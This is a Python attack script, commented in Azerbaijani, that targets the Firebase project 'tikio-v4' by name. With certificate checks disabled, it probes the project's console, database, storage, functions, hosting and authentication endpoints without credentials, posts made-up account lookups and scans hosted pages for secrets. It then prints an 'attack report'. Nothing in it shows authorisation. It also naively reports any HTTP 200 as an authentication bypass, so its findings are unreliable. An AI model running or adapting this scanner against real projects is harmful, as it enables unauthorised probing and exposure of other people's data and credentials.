#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 FIREBASE CONSOLE REAL HÜCUM SCRIPT
Bu script Firebase console-a hücum edir və vulnerability-ləri axtarır
"""

import requests
import json
import time
import re
from urllib.parse import urljoin, urlparse
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FirebaseAttacker:
    def __init__(self, project_id="tikio-v4"):
        self.project_id = project_id
        self.base_url = f"https://console.firebase.google.com/project/{project_id}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
    def test_project_access(self):
        """Firebase project-ə giriş cəhdi"""
        print(f"🔍 Firebase project yoxlanılır: {self.project_id}")
        
        try:
            response = self.session.get(self.base_url, verify=False, timeout=10)
            print(f"   📊 Status Code: {response.status_code}")
            print(f"   📏 Content Length: {len(response.content)}")
            
            if response.status_code == 200:
                print("   ✅ Project-ə giriş mümkündür!")
                return True
            elif response.status_code == 404:
                print("   ❌ Project tapılmadı")
                return False
            elif response.status_code == 403:
                print("   ⚠️ Giriş qadağandır (permission required)")
                return False
            else:
                print(f"   ❓ Naməlum status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return False
            
    def test_firebase_apis(self):
        """Firebase API endpoint-lərini test edir"""
        print("\n🔌 Firebase API endpoint-ləri test edilir...")
        
        api_endpoints = [
            f"https://{self.project_id}.firebaseapp.com",
            f"https://{self.project_id}.appspot.com",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}",
            f"https://fcm.googleapis.com/v1/projects/{self.project_id}",
        ]
        
        accessible_apis = []
        
        for endpoint in api_endpoints:
            try:
                print(f"   🌐 Test edilir: {endpoint}")
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"      ✅ Mümkündür! Status: {response.status_code}")
                    accessible_apis.append(endpoint)
                elif response.status_code == 401:
                    print(f"      ⚠️ Authentication tələb olunur")
                elif response.status_code == 403:
                    print(f"      ❌ Giriş qadağandır")
                else:
                    print(f"      ❓ Status: {response.status_code}")
                    
            except Exception as e:
                print(f"      ❌ Xəta: {e}")
                
        return accessible_apis
        
    def test_firebase_config(self):
        """Firebase konfiqurasiya fayllarını axtarır"""
        print("\n📁 Firebase konfiqurasiya faylları axtarılır...")
        
        config_urls = [
            f"https://{self.project_id}.firebaseapp.com/.well-known/apple-app-site-association",
            f"https://{self.project_id}.firebaseapp.com/.well-known/assetlinks.json",
            f"https://{self.project_id}.firebaseapp.com/firebase.json",
            f"https://{self.project_id}.firebaseapp.com/firebase-messaging-sw.js",
            f"https://{self.project_id}.appspot.com/firebase.json",
        ]
        
        found_configs = []
        
        for url in config_urls:
            try:
                response = self.session.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ Tapıldı: {url}")
                    print(f"      📊 Content: {response.text[:200]}...")
                    found_configs.append(url)
                else:
                    print(f"   ❌ Tapılmadı: {url} (Status: {response.status_code})")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return found_configs
        
    def test_firebase_auth(self):
        """Firebase Authentication test edir"""
        print("\n🔐 Firebase Authentication test edilir...")
        
        auth_endpoints = [
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:lookup",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:query",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:batchGet",
        ]
        
        auth_vulnerabilities = []
        
        for endpoint in auth_endpoints:
            try:
                # Test data ilə request
                test_data = {
                    "localId": ["test_user"],
                    "email": ["test@example.com"],
                    "phoneNumber": ["+1234567890"]
                }
                
                response = self.session.post(endpoint, json=test_data, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {endpoint} - Authentication bypass mümkün!")
                    auth_vulnerabilities.append(endpoint)
                elif response.status_code == 401:
                    print(f"   ✅ Təhlükəsiz: {endpoint} - Authentication tələb olunur")
                else:
                    print(f"   ❓ Naməlum: {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return auth_vulnerabilities
        
    def test_firebase_firestore(self):
        """Firebase Firestore test edir"""
        print("\n🗄️ Firebase Firestore test edilir...")
        
        firestore_endpoints = [
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/users",
            f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents/posts",
        ]
        
        firestore_vulnerabilities = []
        
        for endpoint in firestore_endpoints:
            try:
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {endpoint} - Firestore data-ya giriş mümkün!")
                    firestore_vulnerabilities.append(endpoint)
                elif response.status_code == 401:
                    print(f"   ✅ Təhlükəsiz: {endpoint} - Authentication tələb olunur")
                else:
                    print(f"   ❓ Naməlum: {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return firestore_vulnerabilities
        
    def test_firebase_storage(self):
        """Firebase Storage test edir"""
        print("\n💾 Firebase Storage test edilir...")
        
        storage_endpoints = [
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/users",
            f"https://storage.googleapis.com/storage/v1/b/{self.project_id}/o/images",
        ]
        
        storage_vulnerabilities = []
        
        for endpoint in storage_endpoints:
            try:
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {endpoint} - Storage data-ya giriş mümkün!")
                    storage_vulnerabilities.append(endpoint)
                elif response.status_code == 401:
                    print(f"   ✅ Təhlükəsiz: {endpoint} - Authentication tələb olunur")
                else:
                    print(f"   ❓ Naməlum: {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return storage_vulnerabilities
        
    def test_firebase_functions(self):
        """Firebase Functions test edir"""
        print("\n⚡ Firebase Functions test edilir...")
        
        function_endpoints = [
            f"https://us-central1-{self.project_id}.cloudfunctions.net",
            f"https://europe-west1-{self.project_id}.cloudfunctions.net",
            f"https://asia-east1-{self.project_id}.cloudfunctions.net",
        ]
        
        function_vulnerabilities = []
        
        for endpoint in function_endpoints:
            try:
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {endpoint} - Functions-ə giriş mümkün!")
                    function_vulnerabilities.append(endpoint)
                elif response.status_code == 404:
                    print(f"   ✅ Təhlükəsiz: {endpoint} - Functions tapılmadı")
                else:
                    print(f"   ❓ Naməlum: {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {endpoint} - {e}")
                
        return function_vulnerabilities
        
    def test_firebase_hosting(self):
        """Firebase Hosting test edir"""
        print("\n🌐 Firebase Hosting test edilir...")
        
        hosting_urls = [
            f"https://{self.project_id}.web.app",
            f"https://{self.project_id}.firebaseapp.com",
            f"https://{self.project_id}.appspot.com",
        ]
        
        hosting_vulnerabilities = []
        
        for url in hosting_urls:
            try:
                response = self.session.get(url, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ Hosting aktiv: {url}")
                    
                    # Source code-da sensitive məlumatları axtar
                    content = response.text.lower()
                    sensitive_patterns = [
                        'api_key', 'secret', 'password', 'token', 'private_key',
                        'firebase_config', 'database_url', 'storage_bucket'
                    ]
                    
                    for pattern in sensitive_patterns:
                        if pattern in content:
                            print(f"      ⚠️ SENSITIVE DATA: {pattern} tapıldı!")
                            hosting_vulnerabilities.append(f"{url}:{pattern}")
                            
                else:
                    print(f"   ❌ Hosting deaktiv: {url} (Status: {response.status_code})")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return hosting_vulnerabilities
        
    def test_firebase_realtime_db(self):
        """Firebase Realtime Database test edir"""
        print("\n⚡ Firebase Realtime Database test edilir...")
        
        rtdb_urls = [
            f"https://{self.project_id}-default-rtdb.firebaseio.com",
            f"https://{self.project_id}-default-rtdb.europe-west1.firebasedatabase.app",
            f"https://{self.project_id}-default-rtdb.asia-southeast1.firebasedatabase.app",
        ]
        
        rtdb_vulnerabilities = []
        
        for url in rtdb_urls:
            try:
                response = self.session.get(f"{url}/.json", verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ⚠️ VULNERABILITY: {url} - Database data-ya giriş mümkün!")
                    rtdb_vulnerabilities.append(url)
                elif response.status_code == 401:
                    print(f"   ✅ Təhlükəsiz: {url} - Authentication tələb olunur")
                else:
                    print(f"   ❓ Naməlum: {url} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Xəta: {url} - {e}")
                
        return rtdb_vulnerabilities
        
    def generate_attack_report(self, results):
        """Hücum hesabatı yaradır"""
        print("\n" + "="*70)
        print("🔥 FIREBASE CONSOLE HÜCUM HESABATI")
        print("="*70)
        
        total_vulnerabilities = 0
        
        for category, vulns in results.items():
            if vulns:
                print(f"\n📂 {category.upper()}:")
                for vuln in vulns:
                    print(f"   ⚠️ {vuln}")
                    total_vulnerabilities += 1
            else:
                print(f"\n📂 {category.upper()}: ✅ Təhlükəsiz")
                
        print(f"\n🎯 ÜMUMİ VULNERABILITY-LƏR: {total_vulnerabilities}")
        
        if total_vulnerabilities > 0:
            print("\n🚨 TƏHLÜKƏSİZLİK XƏBƏRDARLIĞI:")
            print("   • Firebase project-də təhlükəsizlik açıqları var!")
            print("   • Dərhal təhlükəsizlik tədbirləri görülməlidir!")
            print("   • Authentication və authorization yoxlanılmalıdır!")
        else:
            print("\n✅ TƏHLÜKƏSİZLİK STATUSU:")
            print("   • Firebase project təhlükəsizdir")
            print("   • Bütün endpoint-lər düzgün qorunur")
            
        return total_vulnerabilities
        
    def run_all_attacks(self):
        """Bütün hücumları işə salır"""
        print("🚀 FIREBASE CONSOLE HÜCUM BAŞLAYIR...")
        print("="*60)
        
        # Project access test
        if not self.test_project_access():
            print("❌ Firebase project-ə giriş mümkün deyil!")
            return
            
        # Bütün hücumları test et
        results = {
            "API Endpoints": self.test_firebase_apis(),
            "Configuration Files": self.test_firebase_config(),
            "Authentication": self.test_firebase_auth(),
            "Firestore": self.test_firebase_firestore(),
            "Storage": self.test_firebase_storage(),
            "Functions": self.test_firebase_functions(),
            "Hosting": self.test_firebase_hosting(),
            "Realtime Database": self.test_firebase_realtime_db(),
        }
        
        # Hesabat yarat
        total_vulns = self.generate_attack_report(results)
        
        print(f"\n🎯 HÜCUM TAMAMLANDI! Tapılan vulnerability-lər: {total_vulns}")
        
        return results

if __name__ == "__main__":
    # Firebase project ID
    project_id = "tikio-v4"
    
    # Hücum başlat
    attacker = FirebaseAttacker(project_id)
    results = attacker.run_all_attacks()